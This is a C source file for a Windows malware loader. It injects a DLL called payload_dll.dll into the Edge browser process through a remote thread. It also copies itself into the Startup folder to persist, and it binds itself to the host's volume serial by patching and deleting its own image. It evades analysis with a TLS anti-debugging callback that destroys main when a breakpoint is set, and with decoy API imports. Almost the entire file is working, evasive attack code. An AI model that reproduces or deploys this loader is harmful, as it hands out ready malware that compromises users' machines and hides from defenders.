#include <stdio.h>
#include <Windows.h>
#include <Winternl.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <strsafe.h>

#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")

//----------------------------------------------------------------------------------------------------------------

#define OVERWRITE_SIZE				0x500
#define INT3_INSTRUCTION_OPCODE		0xCC

//----------------------------------------------------------------------------------------------------------------
#define ERROR_BUF_SIZE				(MAX_PATH * 2)
//----------------------------------------------------------------------------------------------------------------
#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }  

//----------------------------------------------------------------------------------------------------------------

extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}

//----------------------------------------------------------------------------------------------------------------
// TLS Callback Function Prototypes:

VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()
//----------------------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------------------
 
#include <Winternl.h>

// ========================================================================================================================================

#define INITIAL_VALUE 0x4E554C4C

CONST DWORD g_dwSerialNumberConstVariable = INITIAL_VALUE;

// ========================================================================================================================================

// Function to read self image from disk
BOOL ReadSelfFromDiskW(IN LPWSTR szLocalImageName, OUT ULONG_PTR* pModule, OUT DWORD* pdwFileSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	PBYTE		pFileBuffer = NULL;
	DWORD		dwFileSize = 0x00,
		dwNumberOfBytesRead = 0x00;

	// Check if the parameters are valid
	if (!szLocalImageName || !pModule || !pdwFileSize)
		return FALSE;

	// Open the file
	if ((hFile = CreateFileW(szLocalImageName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Get the file size
	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Allocate memory for the file
	if ((pFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Read the file
	if (!ReadFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Return the file buffer and the file size
	*pModule = (ULONG_PTR)pFileBuffer;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*pModule && pFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pFileBuffer);
	return *pModule == NULL ? FALSE : TRUE;
}

// ========================================================================================================================================

// Function to write self image to disk
BOOL WriteSelfToDiskW(IN LPWSTR szLocalImageName, IN PVOID pImageBase, IN DWORD sImageSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten = 0x00;

	// Check if the parameters are valid
	if (!szLocalImageName || !pImageBase || !sImageSize)
		return FALSE;

	// Open the file
	if ((hFile = CreateFileW(szLocalImageName, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Write the file
	if (!WriteFile(hFile, pImageBase, sImageSize, &dwNumberOfBytesWritten, NULL) || sImageSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return dwNumberOfBytesWritten == sImageSize ? TRUE : FALSE;
}

// ========================================================================================================================================

// Structure for File Deletion
typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;
		DWORD Flags;
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
	HANDLE RootDirectory;
	DWORD FileNameLength;
	WCHAR FileName[MAX_PATH]; // Instead of "WCHAR FileName[1]" (See FILE_RENAME_INFO's original documentation)
} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;

// Function to delete file image from disk
BOOL DeleteSelfFromDiskW(IN LPCWSTR szFileName) {

	BOOL						bResult = FALSE;
	HANDLE                      hFile = INVALID_HANDLE_VALUE;
	FILE_DISPOSITION_INFO       DisposalInfo = { .DeleteFile = TRUE };
	FILE_RENAME_INFO2			RenameInfo = { .FileNameLength = sizeof(L":%x%x\x00"), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };

	// Check if the parameters are valid
	if (!szFileName)
		return FALSE;

	// Generate a random name
	swprintf(RenameInfo.FileName, MAX_PATH, L":%x%x\x00", rand(), rand() * rand());

	// Open the file
	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Rename the file
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Close the handle
	CloseHandle(hFile);

	// Open the file again
	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Delete the file
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Set the result to TRUE
	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResult;
}


// ========================================================================================================================================

// Function to Enable DRM
BOOL IsSameMachine() {

	BOOL					bResult = FALSE;
	LPWSTR					szLocalImage = NULL;
	ULONG_PTR				uModule = NULL,
		                    uMachineSerialVA = NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
	PIMAGE_SECTION_HEADER	pImgSec = NULL;
	DWORD					dwSerialNumber = 0x00,
		                    dwFileSize = 0x00;

	// Get the volume serial number
	if (!GetVolumeInformationW(L"C:\\", NULL, 0x00, &dwSerialNumber, NULL, NULL, NULL, 0x00) || dwSerialNumber == 0x00) {
		printf("[!] GetVolumeInformationW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// Print the serial number
	printf("[i] New Volume Serial Number: 0x%0.4X\n", dwSerialNumber);
	printf("[i] Old Volume Serial Number: 0x%0.4X\n", g_dwSerialNumberConstVariable);

	// Same machine (Already patched)
	if (g_dwSerialNumberConstVariable == dwSerialNumber) {
		printf("[*] Same Machine \n");
		return TRUE;
	}

	// Serial Number is not the same as the initial value or the runtime-serial number (dwSerialNumber)
	if (g_dwSerialNumberConstVariable != INITIAL_VALUE) {
		printf("[!] Different Machine \n");
		return FALSE;
	}

	// g_dwSerialNumberConstVariable is equal to 'INITIAL_VALUE', then we patch it:
	printf("[i] First Time Running, Patching Image ... \n");

	// Read local image
	szLocalImage = (LPWSTR)(((PPEB)__readgsqword(0x60))->ProcessParameters->ImagePathName.Buffer);
	if (!ReadSelfFromDiskW(szLocalImage, &uModule, &dwFileSize))
		goto _FUNC_CLEANUP;

	// Fetch the Nt Headers
	pImgNtHdrs = uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew;
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _FUNC_CLEANUP;

	// Fetch the value of the 'g_dwSerialNumberConstVariable' variable inside the .rdata section
	pImgSec = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections && !uMachineSerialVA; i++) {

		// Check if the section name is '.rdata'
		if (*(ULONG*)pImgSec[i].Name == 'adr.') {

			// Search for the serial number
			for (int x = 0; x < pImgSec[i].SizeOfRawData && !uMachineSerialVA; x += sizeof(DWORD)) {

				// If the value is equal to the 'g_dwSerialNumberConstVariable'
				if (*(DWORD*)(uModule + pImgSec[i].PointerToRawData + x) == g_dwSerialNumberConstVariable)
					uMachineSerialVA = (uModule + pImgSec[i].PointerToRawData + x);
			}
		}
	}

	// If fetched
	if (uMachineSerialVA != 0x00) {

		// Patch it with the serial number
		*(DWORD*)uMachineSerialVA = dwSerialNumber;

		// Delete old image from disk
		if (!DeleteSelfFromDiskW(szLocalImage))
			goto _FUNC_CLEANUP;

		// Write the new version (patched)
		if (!WriteSelfToDiskW(szLocalImage, uModule, dwFileSize))
			goto _FUNC_CLEANUP;

		bResult = TRUE;
	}


_FUNC_CLEANUP:
	if (uModule != NULL)
		HeapFree(GetProcessHeap(), 0x00, uModule);
	return bResult;
}

// Function to move the current running binary to the startup folder
BOOL MoveToStartup() {
    wchar_t szStartupPath[MAX_PATH];
    wchar_t szCurrentPath[MAX_PATH];
    wchar_t szNewPath[MAX_PATH];

    // Get the path of the startup folder
    if (FAILED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
        printf("[!] SHGetFolderPath Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    // Get the current location of the binary
    DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
    if (length == 0) {
        printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    // Construct the new path in the startup folder
    wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
    if (lastSlash != NULL) {
        StringCchPrintf(szNewPath, MAX_PATH, L"%s%s", szStartupPath, lastSlash);
    } else {
        printf("[!] Failed to construct new path\n");
        return FALSE;
    }

    // Copy the binary to the startup folder
    if (!CopyFile(szCurrentPath, szNewPath, FALSE)) {
        printf("[!] CopyFile Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully moved the binary to the startup folder\n");
    return TRUE;
}

// Function to add Whitelisted APIs to camouflage IAT
VOID IATCamoflage2() {
	ULONG_PTR uAddress = NULL;

	if (!(uAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100))) {
		return;
	}

	if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
		RegCloseKey(NULL);
		RegDeleteKeyExA(NULL, NULL, NULL, NULL);
		RegDeleteKeyExW(NULL, NULL, NULL, NULL);
		RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegisterServiceCtrlHandlerA(NULL, NULL);
		RegisterServiceCtrlHandlerW(NULL, NULL);
	}

	if (!HeapFree(GetProcessHeap(), 0x00, uAddress)) {
		return;
	}
}

// Function to enumerate processes and get the handle of the remote process
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessID, OUT HANDLE* hProcess) {

	// Initialize the process entry structure
	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	// Get the snapshot of the processes
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	//Read First Process
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error Code: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	//Read The Remaining Processes
	do {
		// If the process name matches the required process name
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Get the process ID
			*dwProcessID = Proc.th32ProcessID;
			//Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);
			if (*hProcess == NULL) {
				printf("[!] OpenProcess Failed With Error Code: %d\n", GetLastError());
			}
			break;
		}
	} while (Process32Next(hSnapShot, &Proc));

	// Close the handle to the snapshot
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessID == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

//Function to inject the payload into the remote process
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
	BOOL		bSTATE = TRUE;
	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;

	// fetching the size of DllName in bytes
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;

    // Load LoadLibraryW WinAPI Function by opening a handle to kernel32.dll
	//Opening a handle to kernel32.dll
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[!] GetModuleHandle Failed With Error Code: %d\n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

	// Get the address of LoadLibraryW and loading it
    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

	//Allocate Memory in the remote process to store the Dll Name
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d Bytes\n", pAddress, dwSizeToWrite);

	//Write the Dll Name to the allocated memory
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	printf("[i] Successfully Written %lld Bytes\n", lpNumberOfBytesWritten);
	printf("[i] Dll Name Written To The Remote Process\n");

	printf("[i] Executing Payload ...\n");
	printf("[+] Creating Remote Thread To Load The Dll\n");

	//Executing the payload by creating a new remote thread
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	printf("[+] Remote Thread Created Successfully\n");

_EndOfFunction:
	if (hThread) {
		CloseHandle(hThread);
	}
	return bSTATE;

}

int main() {

	// Camoflage the IAT
	IATCamoflage2();

	// Enable DRM
	IsSameMachine();
	// Hardcoded process name
	wchar_t szProcessName[] = L"msedge.exe";

	// Get the current location of the binary
	wchar_t szCurrentPath[MAX_PATH];
	DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
	if (length == 0) {
		printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
		return -1;
	}

	// Remove the executable name from the path
	wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
	if (lastSlash != NULL) {
		*lastSlash = L'\0';
	}

	// Append the DLL name to the path
	wchar_t szDllPath[MAX_PATH];
	swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);

	DWORD dwProcessID;
	HANDLE hProcess;

	// Get the handle of the target remote process
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
		printf("[!] Failed to get handle of the target process\n");
		return -1;
	}

	printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);

	// Inject the DLL into the remote process
	if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
		printf("[!] Failed to inject DLL into the target process\n");
		CloseHandle(hProcess);
		return -1;
	}

	// Move the binary to the startup folder
	if (!MoveToStartup()) {
		printf("[!] Failed to move the binary to the startup folder\n");
		return -1;
	}

	printf("[+] DLL injected successfully\n");

	// To delete
	printf("[*] Press any key to exit\n");
	getchar();

	// Close the handle to the process
	CloseHandle(hProcess);

	return 0;
}

// Anti-debugging TLS Callback Function
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {

	DWORD		dwOldProtection = 0x00;

	// Get the address of the main function
	if (dwReason == DLL_PROCESS_ATTACH) {
		PRINT("[TLS][i] Main Function Address: 0x%p \n", main);

		// Check if the entry point is patched with INT 3 instruction
		if (*(BYTE*)main == INT3_INSTRUCTION_OPCODE) {
			PRINT("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");

			// Overwrite main function - process crash
			if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
				memset(main, 0xFF, OVERWRITE_SIZE);
				PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
			}

			// Restore the original protection
			else {
				PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
			}

		}
	}
}